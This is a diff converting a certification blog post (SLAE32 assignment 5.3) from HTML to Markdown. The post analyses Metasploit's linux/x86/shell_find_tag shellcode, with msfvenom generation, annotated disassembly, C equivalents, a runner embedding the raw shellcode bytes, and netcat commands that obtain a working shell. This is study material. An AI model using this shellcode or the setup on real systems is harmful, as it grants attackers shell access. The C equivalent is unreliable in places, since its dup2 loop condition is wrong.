@@ -1,13 +1,30 @@
 Title: SLAE32 - Assignment 5.3
 Date: 2022-06-04T10:43:54.000Z
 
-<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: PA-30398</p><h2 id="source-code">Source Code</h2><!--kg-card-begin: markdown--><p>The full source code is stored inside the repository created for this Exam: <a href="https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/5/part/3">rbctee/SlaeExam</a>.</p>
-<p>List of files:</p>
-<ul>
-<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/5/part/3/mimick_shellcode.c">mimick_shellcode.c</a>, a C program that I've written to imitate the instructions ran by the shellcode</li>
-<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/5/part/3/run_shellcode.c">run_shellcode.c</a>, a C program that runs the shellcode analysed in this post</li>
-</ul>
-<!--kg-card-end: markdown--><h2 id="analysis">Analysis</h2><p>I chose the following 4 shellcode samples:</p><!--kg-card-begin: markdown--><table>
+
+## Disclaimer
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:
+
+https://www.pentesteracademy.com/course?id=3
+
+Student ID: PA-30398
+
+## Source Code
+
+The full source code is stored inside the repository created for this Exam: [rbctee/SlaeExam](https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/5/part/3).
+
+List of files:
+
+- [mimick_shellcode.c](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/5/part/3/mimick_shellcode.c), a C program that I've written to imitate the instructions ran by the shellcode
+
+- [run_shellcode.c](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/5/part/3/run_shellcode.c), a C program that runs the shellcode analysed in this post
+
+## Analysis
+
+I chose the following 4 shellcode samples:
+
+<table>
 <thead>
 <tr>
 <th>Name</th>
@@ -33,9 +50,29 @@ Date: 2022-06-04T10:43:54.000Z
 </tr>
 </tbody>
 </table>
-<!--kg-card-end: markdown--><p>In this post I'll analyze <code>linux/x86/shell_find_tag</code>.</p><h3 id="ndisasm">NDISASM</h3><p>To generate the payload:</p><pre><code class="language-bash">msfvenom -p linux/x86/shell_find_tag -o shellcode.bin
-</code></pre><p>To analyze it with <code>ndisasm</code>:</p><pre><code class="language-bash">ndisasm shellcode.bin -b 32 -p intel
-</code></pre><p>It returns the following output (comments are mine though):</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">                            ; clear EBX and push 0x00000000 to the stack
+
+In this post I'll analyze `linux/x86/shell_find_tag`.
+
+### NDISASM
+
+To generate the payload:
+
+```bash
+msfvenom -p linux/x86/shell_find_tag -o shellcode.bin
+
+```
+
+To analyze it with `ndisasm`:
+
+```bash
+ndisasm shellcode.bin -b 32 -p intel
+
+```
+
+It returns the following output (comments are mine though):
+
+```nasm
+                            ; clear EBX and push 0x00000000 to the stack
 00000000  31DB              xor ebx,ebx
 00000002  53                push ebx
 
@@ -64,11 +101,11 @@ Date: 2022-06-04T10:43:54.000Z
                             ; store into ECX the pointer to its arguments
 0000000C  89E1              mov ecx,esp
 
-                            ; exchanges BH with BL, so 0x0a00 -&gt; 0x000a
+                            ; exchanges BH with BL, so 0x0a00 -> 0x000a
                             ; EBX = 0xa (SYS_RECV)
 0000000E  86FB              xchg bh,bl
 
-                            ; 0x0a00 -&gt; 0x0a01
+                            ; 0x0a00 -> 0x0a01
 00000010  66FF01            inc word [ecx]
 
                             ; call socketcall() syscall, which in turn calls recv()
@@ -79,7 +116,13 @@ Date: 2022-06-04T10:43:54.000Z
                             ; pointer to the buffer storing data received with recv()
                             ; check if the first bytes are the string "fjHh
 00000018  813E666A4868      cmp dword [esi],0x68486a66
-0000001E  75F0              jnz 0x10</code></pre><figcaption>If the first 4 bytes of the buffer of <code>recv()</code> aren't equal to the string <code>fjHh</code>, <code>recv()</code> is called with a file descriptor that <strong>keeps increasing</strong></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-nasm">                            ; save the file descriptor of the socket into EDI and EBX
+0000001E  75F0              jnz 0x10
+```
+
+<figcaption class="figure-caption">If the first 4 bytes of the buffer of `recv()` aren't equal to the string `fjHh`, `recv()` is called with a file descriptor that **keeps increasing**</figcaption>
+
+```nasm
+                            ; save the file descriptor of the socket into EDI and EBX
 00000020  5F                pop edi
 00000021  89FB              mov ebx,edi
 
@@ -95,7 +138,13 @@ Date: 2022-06-04T10:43:54.000Z
                             ; decrease ECX by 1 and jump to the address 00000026
 0000002B  49                dec ecx
 0000002C  79F8              jns 0x26
-</code></pre><figcaption>The last two instructions loop three times, from ECX=2 to ECX=0, in order to redirect respectively <code>stderr</code>, <code>stdout</code>, and <code>stdin</code> to the file descriptor of the socket</figcaption></figure><pre><code class="language-nasm">                            ; set EAX to 0x0000000b
+
+```
+
+<figcaption class="figure-caption">The last two instructions loop three times, from ECX=2 to ECX=0, in order to redirect respectively `stderr`, `stdout`, and `stdin` to the file descriptor of the socket</figcaption>
+
+```nasm
+                            ; set EAX to 0x0000000b
 0000002E  6A0B              push byte +0xb
 00000030  58                pop eax
 
@@ -126,7 +175,26 @@ Date: 2022-06-04T10:43:54.000Z
 
                             ; call syscall 0xb (11): execve()
 00000043  CD80              int 0x80
-</code></pre><p>This last block of disassembly looks similar to what I've written for the 1st and 2nd assignments.</p><p>It simply calls the syscall <code>execve</code> in order to spawn a shell, in particular <code>/bin//sh</code>.</p><p>To recapitulate what the shellcode does:</p><ol><li>the shellcode calls <code>recv</code> in order to receive data from the file descriptor <code>0xa00</code> (2560) of the socket</li><li>the shellcode checks the first 4 bytes of the buffer storing the data received</li><li>if they aren't equal to <code>0x68486a66</code>, then it <strong>increases</strong> the file descriptor (<code>0xa00</code> -&gt; <code>0xa01</code> -&gt; <code>0xa02</code> ...), until <code>0xffff</code>, after that it starts again from <code>0x0000</code></li><li>if they are equal, it continues execution</li><li>the syscall <code>dup2</code> is used for redirecting standard error, standard output, and standard input (in this specific order) towards the file descriptor of the socket</li><li>the shellcode uses the syscall <code>execve</code> to spawn the shell <code>/bin/sh</code></li></ol><p>It translates to the following <code>C</code> program, although with some minor differences:</p><pre><code class="language-cpp">#include &lt;sys/socket.h&gt;
+
+```
+
+This last block of disassembly looks similar to what I've written for the 1st and 2nd assignments.
+
+It simply calls the syscall `execve` in order to spawn a shell, in particular `/bin//sh`.
+
+To recapitulate what the shellcode does:
+
+<ol><li>the shellcode calls `recv` in order to receive data from the file descriptor `0xa00` (2560) of the socket
+- the shellcode checks the first 4 bytes of the buffer storing the data received
+- if they aren't equal to `0x68486a66`, then it **increases** the file descriptor (`0xa00` -> `0xa01` -> `0xa02` ...), until `0xffff`, after that it starts again from `0x0000`
+- if they are equal, it continues execution
+- the syscall `dup2` is used for redirecting standard error, standard output, and standard input (in this specific order) towards the file descriptor of the socket
+- the shellcode uses the syscall `execve` to spawn the shell `/bin/sh`
+
+It translates to the following `C` program, although with some minor differences:
+
+```cpp
+#include <sys/socket.h>
 
 void main(int argc, char *argv[])
 {
@@ -160,7 +228,7 @@ void main(int argc, char *argv[])
     }
 
     // redirect stderr, stdout, stdin
-    for (int i = 2; i &lt;= 0; i++)
+    for (int i = 2; i <= 0; i++)
     {
         dup2(fd, i);
     }
@@ -171,8 +239,16 @@ void main(int argc, char *argv[])
     */
     system("/bin//sh", "/bin//sh", 0);
 }
-</code></pre><p>If you were to run the shellcode (or the program above) and pass it to <code>strace</code>, you would notice the function <code>recv</code> enters an endless loop, so it will never reach the function <code>dup2</code>.</p><p>To make it work, I wrote some C code that creates a socket and connects to a <em>netcat</em> listener, which sends the string <code>fjHh</code>:</p><pre><code class="language-cpp">#include &lt;sys/socket.h&gt;
-#include &lt;netinet/ip.h&gt;
+
+```
+
+If you were to run the shellcode (or the program above) and pass it to `strace`, you would notice the function `recv` enters an endless loop, so it will never reach the function `dup2`.
+
+To make it work, I wrote some C code that creates a socket and connects to a `netcat` listener, which sends the string `fjHh`:
+
+```cpp
+#include <sys/socket.h>
+#include <netinet/ip.h>
 
 void main(int argc, char *argv[])
 {
@@ -208,7 +284,7 @@ void main(int argc, char *argv[])
     }
 
     printf("[+] Redirecting error, output, and input\n");
-    for (int i = 2; i &gt;= 0; i--)
+    for (int i = 2; i >= 0; i--)
     {
         dup2(fd, i);
     }
@@ -216,9 +292,23 @@ void main(int argc, char *argv[])
     printf("[+] Here's your shell:\n");
     system("/bin//sh", "/bin//sh\n", 0);
 }
-</code></pre><p>In another window, I set up the <code>netcat</code> listener:</p><pre><code class="language-bash">nc -nlp 4444
+
+```
+
+In another window, I set up the `netcat` listener:
+
+```bash
+nc -nlp 4444
 # fjHh
-</code></pre><p>I had to send the string before the C program could connect to it.</p><p>Next, compile and run and C program:</p><pre><code class="language-bash"># compile
+
+```
+
+I had to send the string before the C program could connect to it.
+
+Next, compile and run and C program:
+
+```bash
+# compile
 gcc -w ./file.c
 
 # run
@@ -226,8 +316,16 @@ gcc -w ./file.c
 # [+] Trying to find the correct file descriptor
 # [+] Correct file descriptor: 3
 # [+] Redirecting error, output, and input
-</code></pre><p>In the other window you should now have a <strong>reverse shell</strong>.</p><p>Now that I've tested that it works correctly, I had to change it a bit, replacing some of the C code with the shellcode:</p><pre><code class="language-cpp">#include &lt;sys/socket.h&gt;
-#include &lt;netinet/ip.h&gt;
+
+```
+
+In the other window you should now have a **reverse shell**.
+
+Now that I've tested that it works correctly, I had to change it a bit, replacing some of the C code with the shellcode:
+
+```cpp
+#include <sys/socket.h>
+#include <netinet/ip.h>
 
 unsigned char code[] = \
 "\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86"
@@ -256,8 +354,20 @@ void main(int argc, char *argv[])
     int (*ret)() = (int(*)())code;
     ret();
 }
-</code></pre><p>To compile it:</p><pre><code class="language-bash">gcc -w -fno-stack-protector -z execstack file.c
-</code></pre><p>It worked as expected, spawning a reverse shell in the other window, where I set up the netcat listener:</p><pre><code class="language-bash">rbct@slae:~$ nc -nvl 4444
+
+```
+
+To compile it:
+
+```bash
+gcc -w -fno-stack-protector -z execstack file.c
+
+```
+
+It worked as expected, spawning a reverse shell in the other window, where I set up the netcat listener:
+
+```bash
+rbct@slae:~$ nc -nvl 4444
 # fjHh
 # Connection from 127.0.0.1 port 4444 [tcp/*] accepted
 id
@@ -266,4 +376,8 @@ whoami
 # rbct
 exit
 rbct@slae:~$ 
-</code></pre><p>This type of shellcode would be used in cases where you've already set up a connection to a TCP socket, and you have control over it, so you're able to send the data desired, and most importantly the first 4 bytes specified in the shellcode.</p>
+
+```
+
+This type of shellcode would be used in cases where you've already set up a connection to a TCP socket, and you have control over it, so you're able to send the data desired, and most importantly the first 4 bytes specified in the shellcode.
+
